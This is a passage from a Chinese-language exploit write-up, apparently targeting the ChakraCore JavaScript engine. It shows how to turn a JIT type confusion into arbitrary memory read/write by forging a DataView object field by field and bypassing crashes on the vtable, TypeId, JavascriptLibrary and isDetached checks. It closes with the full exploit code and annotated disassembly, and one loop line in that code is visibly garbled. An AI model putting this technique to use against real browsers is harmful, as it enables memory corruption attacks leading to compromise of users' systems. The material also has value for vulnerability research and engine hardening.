    //000001801D7012BB  mov         dword ptr [rcx+30h],edx 
    //000001801D7012CB  mov         dword ptr [rcx+34h],r9d
下面第五项是一个比较重要的域，表示buffer的size
    fake_object[8]=0x200; fake_object[9]=0;
    //000001801D7012CF  mov         dword ptr [rcx+38h],200h
    //000001801D7012D8  mov         dword ptr [rcx+3Ch],edx
第六项是指向DataView对应的ArrayBuffer
Object的指针，但是使用DataView访问数据时不会使用ArrayBuffer中的地址，而是优先使用第八项buffer指针的地址。所以这里也填零，之后再处理。
    fake_object[10]=0; fake_object[11]=0;
    //000001801D7012ED  mov         dword ptr [rcx+40h],edx  
    //000001801D7012FD  mov         dword ptr [rcx+44h],r9d
第七项是byteoffset，这个值在利用中用不到同样填零。
    fake_object[12]=0; fake_object[13]=0;
第八项是DataView操作的目的缓冲区地址，把这个值指向我们想要操作的地址就可以进行读写操作
    fake_object[14]=base_low+0x58; fake_object[15]=base_high;
    //000001801D70130E  mov         dword ptr [rcx+50h],r10d
    //000001801D70131F  mov         dword ptr [rcx+54h],r9d
## 进行读写操作
在完成伪造DataView之后，我们需要做的是尝试使用这个DataView进行读写内存，因为之前DataView中的很多数据都填零。在函数使用这个DataView时可能发生各种问题，这里就需要通过调试一一bypass这些限制。
首先第一个问题是前面我们知道了DataView拥有getInt16、setInt16等方法可以用于访问数据，但是调用这些方法会需要访问伪造的DataView的虚表。
前面说过目前vtable地址无法获知，但是这些函数是必须使用的，因此需要一种不通过虚表的调用方法。下面给出了不访问对象虚表调用对象函数的方法。
    fake_dataview.getInt32(0);
    //使用call可以避免vtable crash
    DataView.prototype.getInt32.call(fake_dataview,0);
也就是通过Function.prototype.call()方法，所有原型继承自Function的方法都可以使用call方法进行调用，第一个参数相当于c++中的this指针。
这里随意建立的一个DataView对象，目的是取他的 _proto_.getUint32。  
arr[0]保存了伪造的DataView指针,把arr[0]传递过去尝试一下读写。
    var tmp = new ArrayBuffer(16);
    var obj = new DataView(tmp);
    obj.getUint32.call(arr[0],0,true);
代码中没有再访问虚表，虚表的问题得以解决。
## 绕过代码的限制
虽然虚表的问题已经解决，但是此时的读写操作还是不能成功，程序会发生crash。  
因为虽然伪造的fake
DataView中的一些域与控制读写无关，但是代码中可能存在访问这些域的地方。比如我们前面把一些指针域填零，当代码中存在对这些指针访问时就会发生Crash。
首先遇到的第一个问题是在取出DataView数据前会先判断对象的类型是否是DataView。
     const TypeId typeId = recyclableObject->GetTypeId();
     inline TypeId RecyclableObject::GetTypeId() const
        {
            return this->GetType()->GetTypeId();
        }
前面我们设置Type Object指针时是直接置的零，所以会导致空指针访问，这里需要为Type Object寻找一个合适的值。  
目前我们手中拥有的是伪造的fake DataView对象的地址，但是合法的DataView类型的Type
Object指针是没有的。比较容易想到的方法是泄漏或者猜测合法的Type Object地址。  
但是这里比较巧妙的是选择利用fake DataView的空白区域来构造一个fake DataView，前面在构造fake
DataView的时候我们看到了其中有很多空白区域实际上是用不到的。
在fake DataView的第三项布置一个fake typeId，然后把第二项的TypeObject指针指向第三项
    TypeIds_DataView = 56
    //第三项 fake typeId
    fake_object[4]=56; fake_object[5]=0;
    //第二项 TypeObject 指针
    fake_object[2]=base_low+0x68; fake_object[3]=base_high;
之后，又遇到第二个问题，代码中存在这样的访问
    dataview->type->javascriptLibrary
    00007FF8A0C5E25C  mov         rax,qword ptr [rbx+8]  //rax=type object
    00007FF8A0C5E260  mov         rcx,qword ptr [rax+8]  //JavascriptLibrary
上一步中构造中，我们是把Type
Object指向了第三项，那么javascriptLibrary就是第四项，此时为零。代码中javascriptLibrary的值不会真正起作用，但是这个指针必须合法，否则访问时就Crash了。这里我们可以随意找一块空白内存来安放fake
javascriptLibrary。
    //第四项 JavascriptLibrary
    fake_object[6]=base_low+0x58-0x430; fake_object[7]=base_high;
继续运行，接下来，程序又会Crash在这个地方，发现取的是第六项也就是arraybuffer的指针
    00007FF8A0C5E264  mov         rax,qword ptr [rbx+28h]  //arraybuffer
    00007FF8A0C5E268  mov         rcx,qword ptr [rcx+430h]
    00007FF8A0C5E26F  cmp         byte ptr [rax+3Ch],0  //isDetached
前面我们把第六项置零，这里需要对这个值进行访问，并且会检测其中的isDetached域。  
如果isDetached为1，那么说明DataView不可用。幸运的是arraybuffer中其他的域不会被使用到，所以我们可以找到一块为0的内存，把这里的arraybuffer指向这块空白的内存使得isDetached为零即可绕过。
    fake_object[10]=base_low+0x58-0x40; fake_object[11]=base_high;
到这里我们再使用fake DataView就可以发现程序不会再发生crash，能够正常的使用来操作数据了，到此我们的DataView伪造也就完成了。  
概括这一系列操作就是在伪造DataView时，如何构造数据来满足代码的访问。
完整的利用代码如下
    var fake_object = new Array(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);
    var tmp = new ArrayBuffer(16);
    var obj = new DataView(tmp);
    var arr =[1.1,2.2];
    var f64 = new Float64Array(1);
    var i32 = new Int32Array(f64.buffer);
    function opt(f,arr){
        arr[0] = 1.1;
        arr[1] = 'a'.replace('a',f)|0;
        f64[0] = arr[0];
        //000001801D7011B4  mov         rcx,qword ptr [rax+38h]  
        //000001801D7011B8  movsd       mmword ptr [rcx],xmm0  
        var base_low = i32[0];
        var base_high = i32[1];
        i32[0] = base_low +0x58;
        /*
        000001801D7011F1  mov         rdi,qword ptr [rdx+38h]  
        000001801D7011F5  mov         r8d,dword ptr [rdi]  
        000001801D7011F8  mov         r9d,dword ptr [rdi+4]  
        000001801D7011FC  mov         r10d,r8d  
        000001801D7011FF  add         r10d,58h  
        */
        arr[0] = f64[0];
        //00001801D701209  mov         dword ptr [rdi],r10d 
        //vtable
        fake_object[0]=1234; fake_object[1]=0x0;
        /*
        000001801D701260  mov         dword ptr [rcx+18h],edx  
        000001801D701263  xor         edx,edx  
        000001801D701265  mov         dword ptr [rcx+1Ch],edx  
        */
        //TypeObject
        fake_object[2]=base_low+0x68; fake_object[3]=base_high;
        //000001801D701280  mov         dword ptr [rcx+20h],edx  
        //000001801D701290  mov         dword ptr [rcx+24h],r9d 
        //fake TypeId
        fake_object[4]=56; fake_object[5]=0;
        //000001801D701294  mov         dword ptr [rcx+28h],38h
        //000001801D70129D  mov         dword ptr [rcx+2Ch],edx 
        //fake JavascriptLibrary
        fake_object[6]=base_low+0x58-0x430; fake_object[7]=base_high;
        //000001801D7012BB  mov         dword ptr [rcx+30h],edx 
        //000001801D7012CB  mov         dword ptr [rcx+34h],r9d  
        //buffer size
        fake_object[8]=0x200; fake_object[9]=0;
        //000001801D7012CF  mov         dword ptr [rcx+38h],200h
        //000001801D7012D8  mov         dword ptr [rcx+3Ch],edx
        //ArrayBuffer object is detached
        fake_object[10]=base_low+0x58-0x40; fake_object[11]=base_high;
        //000001801D7012ED  mov         dword ptr [rcx+40h],edx  
        //000001801D7012FD  mov         dword ptr [rcx+44h],r9d
        //Buffer address
        fake_object[14]=base_low+0x58; fake_object[15]=base_high;
        //000001801D70130E  mov         dword ptr [rcx+50h],r10d
        //000001801D70131F  mov         dword ptr [rcx+54h],r9d  
    }
    for (var i=0;i2,arr);
    }
    opt(()=>{arr[0]=fake_object;},arr);
    print(obj.getUint32.call(arr[0],0,true));
这里我们成功实现了从type confused到内存读写的转化，成功泄漏出了fake DataView的第一项1234